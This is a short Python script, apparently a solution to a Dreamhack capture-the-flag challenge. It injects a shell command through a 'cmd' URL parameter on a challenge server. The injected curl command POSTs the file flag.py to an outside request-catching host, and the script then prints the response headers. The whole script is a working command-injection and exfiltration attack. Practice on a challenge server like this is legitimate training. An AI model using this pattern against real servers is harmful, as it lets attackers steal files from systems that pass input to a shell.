import requests

url = 'http://host3.dreamhack.games:15703/?cmd='
cmd = 'curl -X POST -d @flag.py https://qbcgkdf.request.dreamhack.games'
c = requests.head(url + cmd)

print(c.headers)